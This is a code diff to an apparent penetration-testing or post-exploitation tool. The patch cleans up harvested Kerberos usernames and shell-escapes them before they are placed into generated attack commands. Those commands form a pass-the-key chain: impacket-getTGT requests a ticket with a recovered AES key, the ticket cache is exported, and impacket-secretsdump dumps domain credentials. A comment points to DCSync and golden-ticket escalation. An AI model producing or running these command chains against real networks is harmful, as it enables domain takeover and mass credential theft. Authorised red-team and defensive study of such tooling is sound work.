@@ -1251,16 +1251,30 @@ def run(report, store, ui=None):
             # Score is between R7 (11ish for domain user hash) and R-GOLDEN
             # (15 for krbtgt). AES256 for regular user is same value tier as
             # PtH - ~8-11 depending on target proximity.
+            # iter-151: normalize _ptk_user. kerberos_key evidence comes from
+            # analyzers/keyword.py where the 'who' capture-group is raw - it
+            # may carry DOMAIN\ prefix (from pwdump-style secretsdump output)
+            # or @dom UPN suffix (from ccache dumps). Strip both so the
+            # impacket URI '{dom}/{user}' is well-formed. Then shell-escape
+            # for splice into single-quoted args.
+            _ptk_user_norm = _ptk_user
+            if "\\" in _ptk_user_norm:
+                _ptk_user_norm = _ptk_user_norm.split("\\", 1)[1]
+            if "@" in _ptk_user_norm:
+                _ptk_user_norm = _ptk_user_norm.split("@", 1)[0]
+            _ptk_user_sh = _sh_sq(_ptk_user_norm)
+            _ptk_dom_sh = _sh_sq(_ptk_dom)
+            _ptk_fqdn_sh = _sh_sq(_ptk_fqdn)
             chains.append(Chain("R-PTK", "pass-the-key",
-                f"Kerberos AES key for {_ptk_user} -> impersonate via TGT",
+                f"Kerberos AES key for {_ptk_user_norm} -> impersonate via TGT",
                 crit=8, conf=0.85, ready=1.5, prox=0.9,      # score 9.18
                 commands=[
                     f"# recovered AES key ({_ev.hash[:16]}...) - request a TGT:",
-                    f"impacket-getTGT '{_ptk_dom}/{_ptk_user}' "
+                    f"impacket-getTGT '{_ptk_dom_sh}/{_ptk_user_sh}' "
                     f"-aesKey {_ev.hash} -dc-ip {_ptk_dc}",
-                    f"export KRB5CCNAME='{_ptk_user}.ccache'",
+                    f"export KRB5CCNAME='{_ptk_user_sh}.ccache'",
                     f"impacket-secretsdump -k -no-pass -dc-ip {_ptk_dc} "
-                    f"'{_ptk_dom}/{_ptk_user}@{_ptk_fqdn}'   "
+                    f"'{_ptk_dom_sh}/{_ptk_user_sh}@{_ptk_fqdn_sh}'   "
                     f"# if user has DCSync rights -> R-GOLDEN cascade",
                 ], src=_ev.source, line=_ev.line))
 
